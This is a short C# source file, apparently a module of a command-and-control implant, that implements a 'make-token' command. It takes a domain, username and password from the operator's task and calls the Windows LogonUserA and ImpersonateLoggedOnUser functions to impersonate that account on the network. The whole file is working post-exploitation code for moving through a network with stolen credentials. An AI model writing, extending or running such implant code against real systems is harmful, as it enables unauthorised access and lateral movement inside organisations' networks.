using Agent.Commands;
using Agent.Helpers;
using Agent.Models;
using Pinvoke;
using System;
using System.Security.Principal;

namespace Commands
{
    public class MakeTokenCommand : AgentCommand
    {
        public override string Name => "make-token";
        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            // make-token DOMAIN\Username Password
            var userDomain = task.SplittedArgs[0];
            var password = task.SplittedArgs[1];

            var split = userDomain.Split('\\');
            var domain = split[0];
            var username = split[1];

            IntPtr hToken = IntPtr.Zero;
            if (Advapi.LogonUserA(username, domain, password, Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS, Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
            {
                if (Advapi.ImpersonateLoggedOnUser(hToken))
                {
                    var identity = new WindowsIdentity(hToken);
                    context.AppendResult($"Successfully impersonated {identity.Name}");
                    ImpersonationHelper.Impersonate(hToken);
                    return;
                }

                context.Error($"Successfully made token but failed to impersonate");
                return;
            }

            context.Error($"Failed to make token");
            return;
        }
    }
}
